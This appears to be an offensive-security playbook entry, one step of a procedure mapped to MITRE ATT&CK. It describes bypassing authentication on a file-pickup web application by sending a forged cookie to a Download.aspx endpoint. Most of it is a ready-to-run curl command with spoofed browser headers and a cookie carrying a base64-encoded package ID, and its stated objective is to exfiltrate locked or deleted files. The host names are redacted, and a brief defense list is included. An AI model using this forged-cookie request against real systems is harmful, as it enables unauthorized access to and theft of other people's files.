---
id: proc-496326-step4
tags:
  - auth-bypass
  - download
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/send-forged-download-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:31:10.893Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Download-File-with-Forged-Cookie

## Summary

This procedure sends an HTTP GET request to the Download.aspx endpoint using the forged cookie to retrieve the file, bypassing CAC and deletion controls.

## Description

With the crafted cookie, issue a GET to /████████/Download.aspx?PackageID=<ID>&FileName=<name>, including headers mimicking a browser. The server accepts the forged cookie as valid auth, serving the file content. This exploits the lack of server-side validation, allowing access to sensitive data.

## Requirements

1. Forged cookie from previous procedure
2. File ID and filename (e.g., dog.jpg)
3. HTTP client like curl
4. Network access to the endpoint

## Defense

Defensive measures and detection strategies:

- Server-side session validation beyond cookies
- Enforce CAC tokens in requests
- Log and block requests with mismatched headers/cookies

## Objectives

1. Retrieve deleted/locked file
2. Confirm auth bypass success
3. Exfiltrate sensitive content

## Instructions

### Step 1: Execute Forged Download Request

**Context**: Send the GET request with the custom cookie and headers to trigger the bypass.

**Command** ([[commands/send-forged-download-request]]):

```bash
curl -X GET "https://███████/████████/Download.aspx?PackageID=15849581&FileName=dog.jpg" \
  -H "Host: ███████" \
  -H "Connection: close" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
  -H "Referer: https://█████/██████████/pickupfiles.aspx?id=15849581" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Cookie: pickup=Subject=&PackageID=MTU4NDk1ODE=████" \
  --output dog.jpg
```

> The response body contains the file (e.g., dog.jpg), with HTTP 200 status, no errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/send-forged-download-request]]

## Tools Used


## Tags

- [[auth-bypass]]
- [[download]]
- [[web]]
